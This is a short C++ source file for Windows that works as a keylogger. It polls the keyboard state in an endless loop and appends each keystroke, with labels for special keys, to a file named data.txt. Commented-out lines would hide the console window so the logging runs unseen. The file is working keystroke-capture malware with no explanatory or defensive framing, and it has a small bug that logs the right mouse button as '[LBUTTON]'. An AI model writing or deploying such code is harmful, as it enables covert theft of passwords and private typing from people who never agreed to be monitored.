#include<iostream>
#include<Windows.h>
#include<fstream>
using namespace std;

fstream file;


void Save(int& key)
{
	file.open("data.txt", fstream::out | fstream::app);
	if (key == VK_DELETE)
	{
		file << "[DELETE]";
	}
	else if (key == VK_LBUTTON)
	{
		file << "[LBUTTON]";
	}
	else if (key == VK_RBUTTON)
	{
		file << "[LBUTTON]";
	}
	else if (key == VK_BACK)
	{
		file << "[BACKSPACE]";
	}
	else if (key == VK_TAB)
	{
		file << "[TAB]";
	}
	else if (key == VK_SHIFT)
	{
		file << "[SHIFT]";
	}
	else if (key == VK_CONTROL)
	{
		file << "[CTRL]";
	}
	else if (key == VK_MENU)
	{
		file << "[ALT]";
	}
	else if (key == VK_CAPITAL)
	{
		file << "[CAPSLOCK]";
	}
	else if (key == VK_ESCAPE)
	{
		file << "[ESCAPE]";
	}
	else file << char(key);
	file.close();
}


int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//FreeConsole();
	while (true)
	{
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				Save(i);
			}
		}
	}
}